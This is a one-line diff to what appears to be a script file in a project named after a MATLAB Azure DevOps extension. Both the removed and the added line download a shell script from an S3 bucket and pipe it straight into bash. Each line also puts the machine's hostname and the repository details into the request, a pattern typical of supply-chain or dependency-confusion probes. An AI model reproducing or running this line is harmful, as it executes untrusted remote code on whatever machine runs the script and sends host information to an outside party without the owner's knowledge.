@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\&folder=scripts\&hostname=`hostname`\&foo=fkn
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/matlab-azure-devops-extension.git\&folder=scripts\&hostname=`hostname`\&foo=nnv
